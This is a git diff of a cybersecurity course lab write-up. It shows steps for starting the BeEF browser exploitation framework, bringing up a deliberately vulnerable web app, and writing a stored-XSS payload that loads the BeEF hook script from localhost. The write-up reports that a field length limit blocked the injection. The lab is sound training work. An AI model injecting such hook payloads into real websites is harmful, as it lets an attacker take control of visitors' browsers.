@@ -107,30 +107,31 @@ Start the `Terminal` in your Virtual Machine.
 
 ### Web Application 3: *Where's the BeEF?*
 ------------------------------------------
-1. Complete the following to set up the activity. 
+#### 1. Set up BeEF  
+  1. From the `Terminal` in Vagrant run the command `sudo beef` to start the **BeEF**  
+  2. When prompted for a password, enter `cybersecurity`.
+  3. This will kick off the BeEF application and return many details about the application to your terminal.
+  4. To access the BeEF GUI, right-click the first URL `UI_URL: http://127.0.0.1:3000/ui/panel` and select Open Link to open in default browser, or copy the link and open the browser of your choice `(Chrome, or Microsoft Edge)`. Paste it in the address bar and press enter.
+  5. When the BeEF webpage opens, login with the following credentials:
+    - Username: `beef`
+    - Password: `feeb`
 
-   - On Vagrant, open a command line and run the following command: `sudo beef`
+#### 2. Prepare the Replicants Website  
+  1. From the `Terminal` in Vagrant navigate to `~/Documents/web-vulns` directory.
+  2. Run the command `sudo docker-compose up`
+  3. Go to the browser and enter the following in the address bar: `http://192.168.13.25/vulnerabilities/xss_s/`
+  4. Reset the database and the login with the following credentials:
+    - Username: `admin`
+    - Password: `password`
 
-   - When prompted for a password, enter `cybersecurity`.
+#### 3. Start the BeEF hook, and write the payload
+  1. From the `Terminal` copy the `BeEF hook: http://127.0.0.1:3000/hook.js`
+  2. Write the `Payload: <script src="http://127.0.0.1:3000/hook.js"></script>`
 
-   - This will kick off the BeEF application and return many details about the application to your terminal.
+#### 4. Inject this payload  
+  - When trying to inject the payload there was an issue found, in the message box field, there was a limit of `maxlength="50"` character in the source code. Therefore we could not inject the payload.
+  ![maxlength=50]()
 
-   - Along with these details are several URLs that can be used to access to BeEF's User Interface (UI). For example: `UI_URL: http://127.0.0.1:3000/ui/panel` 
-   
-   - To access the BeEF GUI, right-click the first URL and select Open Link.
-
-     ![wd_hw10](Images/wd_hw10.png)
-
-   - When the BeEF webpage opens, login with the following credentials:
-     - Username: `beef`
-     
-     - Password: `feeb`
-
-     ![wd_hw11](Images/wd_hw11.png)
-
-   - You have successfully completed the setup when you have reached the `BeEF Control Panel` shown in the image below:
-
-     ![wd_hw12](Images/wd_hw12.png)
 
 2. The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.      
 
